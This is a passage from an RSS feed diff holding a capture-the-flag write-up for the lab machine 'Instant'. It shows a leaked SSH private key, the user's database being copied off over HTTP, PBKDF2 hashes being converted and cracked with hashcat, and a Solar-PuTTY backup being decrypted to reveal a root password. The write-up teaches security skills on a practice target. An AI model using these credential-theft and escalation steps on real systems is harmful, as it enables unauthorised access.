+    &#34;T3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y\n&#34;,
+    &#34;1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0\n&#34;,
+    &#34;cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqA\n&#34;,
+    &#34;wDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAA\n&#34;,
+    &#34;wQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18\n&#34;,
+    &#34;nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCK\n&#34;,
+    &#34;gzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVt\n&#34;,
+    &#34;pErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJh\n&#34;,
+    &#34;HSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FX\n&#34;,
+    &#34;zKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5\n&#34;,
+    &#34;SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOY\n&#34;,
+    &#34;CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ\n&#34;,
+    &#34;n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G\n&#34;,
+    &#34;HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP\n&#34;,
+    &#34;5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\n&#34;,
+    &#34;bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\n&#34;,
+    &#34;-----END OPENSSH PRIVATE KEY-----\n&#34;
+  ],
+  &#34;Status&#34;: 201
+}
+</code></pre><p>I saved the key to a file and cleaned it up. Below is the vim macro I used:</p>
+<pre tabindex="0"><code>:%s/    &#34;//g|%s/&#34;//g|%s/,//g|%s/\\n//g
+</code></pre><p>Now we can authenticate as <code>shirohige</code>.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ ssh -i id_rsa shirohige@instant.htb   
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the &#39;unminimize&#39; command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Mar 29 20:22:54 2025 from 10.10.14.53
+shirohige@instant:~$ 
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Instant&rsquo;s database is stored at <code>~/projects/mywallet/Instant-Api/mywallet/instance/</code>.</p>
+<pre tabindex="0"><code>shirohige@instant:~$ ls -al projects/mywallet/Instant-Api/mywallet/instance/
+total 44
+drwxr-xr-x 2 shirohige shirohige  4096 Oct  4 15:22 .
+drwxr-xr-x 5 shirohige shirohige  4096 Oct  4 15:22 ..
+-rw-r--r-- 1 shirohige shirohige 36864 Sep 30 16:34 instant.db
+</code></pre><p>Sqlite3 installed though, so I transferred it to my local machine for viewing.</p>
+<pre tabindex="0"><code>shirohige@instant:~$ python3 -m http.server 8000 -d projects/mywallet/Instant-Api/mywallet/instance/
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ wget http://instant.htb:8000/instant.db
+--2025-03-29 15:30:35--  http://instant.htb:8000/instant.db
+Resolving instant.htb (instant.htb)... 10.10.11.37
+Connecting to instant.htb (instant.htb)|10.10.11.37|:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 36864 (36K) [application/octet-stream]
+Saving to: ‘instant.db’
+
+instant.db                           100%[======================================================================&gt;]  36.00K  --.-KB/s    in 0.05s   
+
+2025-03-29 15:30:35 (674 KB/s) - ‘instant.db’ saved [36864/36864]
+</code></pre><p>There is a <code>wallet_users</code> table which has, among others, a password column that we can harvest credentials form.</p>
+<pre tabindex="0"><code>sqlite&gt; .schema
+CREATE TABLE wallet_users (
+        id INTEGER NOT NULL, 
+        username VARCHAR, 
+        email VARCHAR, 
+        wallet_id VARCHAR, 
+        password VARCHAR, 
+        create_date VARCHAR, 
+        secret_pin INTEGER, 
+        role VARCHAR, 
+        status VARCHAR, 
+        PRIMARY KEY (id), 
+        UNIQUE (username), 
+        UNIQUE (email), 
+        UNIQUE (wallet_id)
+);
+CREATE TABLE wallet_wallets (
+        id INTEGER NOT NULL, 
+        wallet_id VARCHAR, 
+        balance INTEGER, 
+        invite_token VARCHAR, 
+        PRIMARY KEY (id), 
+        UNIQUE (wallet_id), 
+        UNIQUE (invite_token)
+);
+CREATE TABLE wallet_transactions (
+        id INTEGER NOT NULL, 
+        sender VARCHAR, 
+        receiver VARCHAR, 
+        amount VARCHAR, 
+        txn_fee VARCHAR, 
+        note VARCHAR, 
+        status VARCHAR, 
+        PRIMARY KEY (id)
+);
+sqlite&gt; 
+</code></pre><pre tabindex="0"><code>sqlite&gt; select * from wallet_users;
+1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
+2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
+</code></pre><p>We get the PBKDF2 hashes for <code>admin@instant.htb</code> and <code>shirohige@instant.htb</code>. With any luck, these passwords may be reused. However, they are curently not in a hashcat-friendly format. Hashcat expects <code>sha256:1000:&lt;base64 encoded salt&gt;:&lt;base64 encoded raw binary value of hash&gt;</code>.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ hashcat -m 10900 --hash-info
+hashcat (v6.2.6) starting in hash-info mode
+
+Hash Info:
+==========
+
+Hash mode #10900
+  Name................: PBKDF2-HMAC-SHA256
+  Category............: Generic KDF
+  Slow.Hash...........: Yes
+  Password.Len.Min....: 0
+  Password.Len.Max....: 256
+  Salt.Type...........: Embedded
+  Salt.Len.Min........: 0
+  Salt.Len.Max........: 256
+  Kernel.Type(s)......: pure
+  Example.Hash.Format.: plain
+  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
+  Example.Pass........: hashcat
+  Benchmark.Mask......: ?b?b?b?b?b?b?b
+  Autodetect.Enabled..: Yes
+  Self.Test.Enabled...: Yes
+  Potfile.Enabled.....: Yes
+  Custom.Plugin.......: No
+  Plaintext.Encoding..: ASCII, HEX
+</code></pre><p>Our current hashes&rsquo; salts are not base64 encoded, and the hash is in hexadecimal. Luckily, it isn&rsquo;t difficult to convert the hashes we have to a crackable format. I have a script that automates the process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e"># Convert PBKDF2-HMAC-SHA256 into hashcat-crackable format</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage: ./pbkdf2-hmac-sha256.sh &lt;hash_file&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OUTFILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./crackable_hashes.txt&#39;</span>
+</span></span><span style="display:flex;"><span>TEMPFILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./crackable_hashes.tmp&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$&#39;</span> read -r head salt hash <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        b64_salt<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$salt<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        b64_hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$hash<span style="color:#e6db74">&#34;</span> | xxd -r -p | base64<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        crackable_hash<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$head<span style="color:#e6db74">:</span>$b64_salt<span style="color:#e6db74">:</span>$b64_hash<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$crackable_hash<span style="color:#e6db74">&#34;</span> &gt;&gt; <span style="color:#e6db74">&#34;</span>$OUTFILE<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/\$/\:/g&#39;</span> <span style="color:#e6db74">&#34;</span>$OUTFILE<span style="color:#e6db74">&#34;</span> &gt; <span style="color:#e6db74">&#34;</span>$TEMPFILE<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>mv <span style="color:#e6db74">&#34;</span>$TEMPFILE<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$OUTFILE<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ hashcat -a 0 -m 10900 crackable_hashes.txt /usr/share/wordlists/rockyou.txt --show
+sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
+</code></pre><pre tabindex="0"><code>┌──(venv)─(kali㉿kali)-[/tmp]
+└─$ python3 ~/opt/SolarPuttyCracker/SolarPuttyCracker.py -p estrella /tmp/sessions-backup.dat 
+   ____       __             ___         __   __          _____                 __            
+  / __/___   / /___ _ ____  / _ \ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____
+ _\ \ / _ \ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  &#39;_// -_)/ __/
+/___/ \___//_/ \_,_//_/   /_/    \_,_/ \__/ \__/ \_, /  \___//_/   \_,_/ \__//_/\_\ \__//_/   
+                                                /___/                                         
+Trying to decrypt using password: estrella
+Decryption successful using password: estrella
+[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt
+                                                                                                                                                   
+┌──(venv)─(kali㉿kali)-[/tmp]
+└─$ cat SolarPutty_sessions_decrypted.txt 
+{
+    &#34;Sessions&#34;: [
+        {
+            &#34;Id&#34;: &#34;066894ee-635c-4578-86d0-d36d4838115b&#34;,
+            &#34;Ip&#34;: &#34;10.10.11.37&#34;,
+            &#34;Port&#34;: 22,
+            &#34;ConnectionType&#34;: 1,
+            &#34;SessionName&#34;: &#34;Instant&#34;,
+            &#34;Authentication&#34;: 0,
+            &#34;CredentialsID&#34;: &#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;,
+            &#34;AuthenticateScript&#34;: &#34;00000000-0000-0000-0000-000000000000&#34;,
+            &#34;LastTimeOpen&#34;: &#34;0001-01-01T00:00:00&#34;,
+            &#34;OpenCounter&#34;: 1,
+            &#34;SerialLine&#34;: null,
+            &#34;Speed&#34;: 0,
+            &#34;Color&#34;: &#34;#FF176998&#34;,
+            &#34;TelnetConnectionWaitSeconds&#34;: 1,
+            &#34;LoggingEnabled&#34;: false,
+            &#34;RemoteDirectory&#34;: &#34;&#34;
+        }
+    ],
+    &#34;Credentials&#34;: [
+        {
+            &#34;Id&#34;: &#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;,
+            &#34;CredentialsName&#34;: &#34;instant-root&#34;,
+            &#34;Username&#34;: &#34;root&#34;,
+            &#34;Password&#34;: &#34;12**24nzC!r0c%q12&#34;,
+            &#34;PrivateKeyPath&#34;: &#34;&#34;,
+            &#34;Passphrase&#34;: &#34;&#34;,
+            &#34;PrivateKeyContent&#34;: null
+        }
+    ],
+    &#34;AuthScript&#34;: [],
+    &#34;Groups&#34;: [],
+    &#34;Tunnels&#34;: [],
+    &#34;LogsFolderDestination&#34;: &#34;C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs&#34;
+}
+</code></pre><pre tabindex="0"><code>shirohige@instant:~$ su root
+Password: 
+root@instant:/home/shirohige#
+</code></pre>]]></description>
+      
+    </item>
+    
+    
+  </channel>
+</rss>
